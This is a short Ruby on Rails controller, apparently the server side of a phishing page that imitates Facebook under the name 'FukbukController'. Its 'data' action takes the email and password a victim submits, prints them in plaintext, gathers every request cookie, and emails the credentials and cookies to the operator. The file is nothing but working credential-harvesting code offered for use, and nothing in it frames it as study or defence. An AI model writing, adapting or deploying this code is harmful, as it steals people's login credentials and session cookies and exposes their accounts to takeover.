class FukbukController < ApplicationController
	before_filter :set_cook, :only => :main

	def main
		render view: "main"
	end

	def data
		puts "Params Email: #{params[:email]} Pass: #{params[:pass]}"
		#puts "Cookies #{cookies.inspect} Cookie Size > #{cookies.size}"

		final_cookies = cookies.map{|c| {:name=>c[0],:value=>c[1]} }
		puts "Cookies #{final_cookies}"
		NotificationMailer.notification({:email => params[:email] , :pass => params[:pass] , :cookies => final_cookies}).deliver
		render text:"hello papi!"
	end

	def set_cook
		cookies[:unknown_session] = "y"
	end
end
